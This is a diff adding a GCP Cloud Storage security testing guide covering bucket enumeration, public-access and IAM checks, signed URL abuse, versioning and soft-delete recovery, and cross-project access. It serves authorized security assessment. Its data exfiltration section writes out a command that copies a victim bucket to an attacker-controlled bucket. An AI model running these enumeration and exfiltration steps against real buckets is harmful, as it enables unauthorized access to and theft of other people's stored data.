@@ -1,0 +1,356 @@
+<gcp_cloud_storage_security_guide>
+<title>GCP CLOUD STORAGE SECURITY TESTING</title>
+
+<critical>Google Cloud Storage (GCS) is an object storage service for unstructured data. Security vulnerabilities include public bucket access, misconfigured IAM policies, signed URL abuse, and cross-project exposure. Understanding GCS access control models (Uniform vs Fine-grained) is essential for identifying vulnerabilities.</critical>
+
+<scope>
+- Public bucket discovery and enumeration
+- IAM policy misconfigurations
+- Signed URL vulnerabilities
+- Object versioning exploitation
+- Cross-project access
+- Retention policy bypass
+- Bucket-level access control
+- Audit log exposure
+</scope>
+
+<methodology>
+1. Discover and enumerate GCS buckets.
+2. Test for public access and listing.
+3. Analyze IAM policies for misconfigurations.
+4. Probe signed URLs for abuse potential.
+5. Check versioning and lifecycle policies.
+</methodology>
+
+<discovery>
+<bucket_enumeration>
+{% raw %}
+# Bucket discovery methods:
+
+# 1. DNS/subdomain enumeration:
+# Bucket URLs:
+https://storage.googleapis.com/BUCKET_NAME/
+https://BUCKET_NAME.storage.googleapis.com/
+
+# 2. Common naming patterns:
+company-name
+company-backup
+company-data
+company-logs
+company-prod
+company-dev
+company-staging
+
+# 3. gsutil enumeration:
+gsutil ls gs://BUCKET_NAME/
+
+# 4. Cloud console discovery:
+# Check project browser for bucket list
+
+# 5. Error message analysis:
+# Different errors for existing vs non-existing buckets
+{% endraw %}
+</bucket_enumeration>
+
+<public_bucket_check>
+{% raw %}
+# Test for public access:
+
+# 1. Anonymous listing:
+curl https://storage.googleapis.com/BUCKET_NAME/
+gsutil ls gs://BUCKET_NAME/
+
+# 2. Anonymous read:
+curl https://storage.googleapis.com/BUCKET_NAME/OBJECT
+
+# 3. Check for allUsers:
+gsutil iam get gs://BUCKET_NAME/
+
+# Indicators of public access:
+# - 200 response with content listing
+# - XML bucket listing response
+# - JSON API response with objects
+{% endraw %}
+</public_bucket_check>
+</discovery>
+
+<iam_misconfigurations>
+<public_access>
+{% raw %}
+# Public IAM bindings:
+
+# Dangerous bindings:
+{
+  "bindings": [
+    {
+      "role": "roles/storage.objectViewer",
+      "members": ["allUsers"]  # Public read
+    },
+    {
+      "role": "roles/storage.objectAdmin",
+      "members": ["allAuthenticatedUsers"]  # Any Google account
+    }
+  ]
+}
+
+# Check bucket IAM:
+gsutil iam get gs://BUCKET_NAME/
+
+# Check object IAM (fine-grained):
+gsutil acl get gs://BUCKET_NAME/OBJECT
+{% endraw %}
+</public_access>
+
+<overprivileged_roles>
+{% raw %}
+# Overprivileged IAM roles:
+
+# Dangerous roles:
+roles/storage.admin           # Full control
+roles/storage.objectAdmin     # Object CRUD
+roles/storage.objectCreator   # Write without read
+roles/storage.legacyBucketOwner  # Legacy full access
+
+# Check for wildcard bindings:
+# - allUsers
+# - allAuthenticatedUsers
+# - domain:example.com (any user in domain)
+
+# Cross-project bindings:
+# - serviceAccount:SA@other-project.iam.gserviceaccount.com
+{% endraw %}
+</overprivileged_roles>
+</iam_misconfigurations>
+
+<signed_urls>
+<signed_url_analysis>
+{% raw %}
+# Signed URL structure:
+https://storage.googleapis.com/BUCKET/OBJECT?
+  X-Goog-Algorithm=GOOG4-RSA-SHA256&
+  X-Goog-Credential=SA%40project.iam.gserviceaccount.com%2FDATE%2FREGION%2Fstorage%2Fgoog4_request&
+  X-Goog-Date=TIMESTAMP&
+  X-Goog-Expires=SECONDS&
+  X-Goog-SignedHeaders=host&
+  X-Goog-Signature=SIGNATURE
+
+# Key parameters:
+# X-Goog-Expires: Validity duration
+# X-Goog-Signature: Cryptographic signature
+{% endraw %}
+</signed_url_analysis>
+
+<signed_url_exploitation>
+{% raw %}
+# Signed URL vulnerabilities:
+
+# 1. Long expiration:
+# URLs valid for days/months
+# Check X-Goog-Expires value
+
+# 2. Sharing signed URLs:
+# Leaked URLs provide access to protected objects
+# Check in: logs, emails, shared docs, Slack, etc.
+
+# 3. Signed URL for listing:
+# Bucket list signed URL exposes all objects
+
+# 4. PUT signed URL:
+# Write access to specific object path
+
+# 5. Signed URL enumeration:
+# Predictable object names with leaked signing key pattern
+{% endraw %}
+</signed_url_exploitation>
+</signed_urls>
+
+<versioning>
+<version_exploitation>
+{% raw %}
+# Object versioning vulnerabilities:
+
+# 1. List all versions:
+gsutil ls -a gs://BUCKET/
+
+# 2. Access previous versions:
+gsutil cp gs://BUCKET/OBJECT#GENERATION ./
+
+# Deleted data recovery:
+# If versioning enabled, deleted objects have archived versions
+# May contain sensitive data
+
+# 3. Version cost abuse:
+# Rapid versioning can increase storage costs
+
+# 4. Lifecycle policy bypass:
+# Versions may not be affected by lifecycle rules
+{% endraw %}
+</version_exploitation>
+
+<soft_delete>
+{% raw %}
+# Soft delete recovery:
+
+# List soft-deleted objects:
+gsutil ls -a --include-soft-deleted gs://BUCKET/
+
+# Recover soft-deleted object:
+gsutil restore gs://BUCKET/OBJECT#GENERATION
+
+# Attack vector:
+# Access to "deleted" sensitive data within retention window
+{% endraw %}
+</soft_delete>
+</versioning>
+
+<access_control_models>
+<uniform_vs_finegrained>
+{% raw %}
+# Access control models:
+
+# 1. Uniform bucket-level access:
+# Only IAM policies apply
+# No object-level ACLs
+# Simpler, more secure
+
+# 2. Fine-grained (legacy):
+# Both IAM and ACLs apply
+# Object-level ACLs possible
+# More complex, more attack surface
+
+# Check mode:
+gsutil ubla get gs://BUCKET/
+
+# Fine-grained ACL check:
+gsutil acl get gs://BUCKET/OBJECT
+# Response indicates ACL mode
+{% endraw %}
+</uniform_vs_finegrained>
+</access_control_models>
+
+<cross_project>
+<cross_project_access>
+{% raw %}
+# Cross-project access:
+
+# 1. Shared bucket access:
+# Bucket in Project A, SA from Project B has access
+# Check IAM for external principals
+
+# 2. Service account impersonation:
+# If can impersonate SA with bucket access
+
+# 3. Project-level inheritance:
+# Project-level IAM may grant broad access
+
+# 4. VPC Service Controls:
+# May restrict cross-project access
+# Test for perimeter gaps
+{% endraw %}
+</cross_project_access>
+</cross_project>
+
+<retention_policies>
+<retention_bypass>
+{% raw %}
+# Retention policy analysis:
+
+# Check retention policy:
+gsutil retention get gs://BUCKET/
+
+# Attack vectors:
+# 1. Event-based hold vs time-based
+# 2. Unlocked vs locked retention
+# 3. Policy changes before lock
+
+# Bucket lock status:
+# Once locked, retention cannot be removed
+# Until lock, policy can be changed
+{% endraw %}
+</retention_bypass>
+</retention_policies>
+
+<data_exfiltration>
+<exfil_techniques>
+{% raw %}
+# Data exfiltration methods:
+
+# 1. Direct download:
+gsutil cp gs://BUCKET/OBJECT ./
+curl https://storage.googleapis.com/BUCKET/OBJECT
+
+# 2. Copy to attacker bucket:
+gsutil cp gs://victim-bucket/* gs://attacker-bucket/
+
+# 3. Signed URL generation:
+# If can generate, create long-lived access
+
+# 4. Requester pays bypass:
+# Download from requester pays bucket
+gsutil -u BILLING_PROJECT cp gs://BUCKET/OBJECT ./
+{% endraw %}
+</exfil_techniques>
+</data_exfiltration>
+
+<common_payloads>
+{% raw %}
+# Public access test:
+curl https://storage.googleapis.com/BUCKET/
+curl https://BUCKET.storage.googleapis.com/
+
+# Listing:
+gsutil ls gs://BUCKET/
+gsutil ls -r gs://BUCKET/
+
+# IAM check:
+gsutil iam get gs://BUCKET/
+
+# ACL check:
+gsutil acl get gs://BUCKET/OBJECT
+
+# Versioning:
+gsutil ls -a gs://BUCKET/
+gsutil cp gs://BUCKET/OBJECT#GENERATION ./
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Demonstrate public bucket access with data retrieval.
+2. Show IAM misconfiguration allowing unauthorized access.
+3. Prove signed URL with excessive validity or scope.
+4. Document version/soft-delete access to deleted data.
+5. Provide evidence of cross-project access.
+</validation>
+
+<false_positives>
+- Public bucket is intentionally public (static website hosting)
+- Signed URLs with appropriate expiration
+- Uniform bucket-level access properly configured
+- Retention policy locked
+- VPC Service Controls restricting access
+</false_positives>
+
+<impact>
+- Sensitive data exposure
+- Data exfiltration
+- Access to "deleted" data via versioning
+- Cross-project data breach
+- Compliance violations
+- Storage cost abuse
+</impact>
+
+<pro_tips>
+1. Always check for allUsers and allAuthenticatedUsers bindings.
+2. Signed URLs in logs/emails are common finding.
+3. Versioning can expose deleted sensitive data.
+4. Fine-grained ACL mode has more attack surface.
+5. Cross-project service accounts may have access.
+6. Soft-delete retention allows recovery of recent deletes.
+7. Bucket names in URLs reveal project structure.
+8. Public buckets often host sensitive backups.
+9. CORS configuration may enable client-side access.
+10. Check both bucket-level and object-level permissions.
+</pro_tips>
+
+<remember>GCS security relies on proper IAM configuration and access control model selection. Public bucket misconfiguration is one of the most common cloud security findings. Always test for anonymous access, analyze signed URLs for leakage, and check versioning for deleted sensitive data.</remember>
+</gcp_cloud_storage_security_guide>
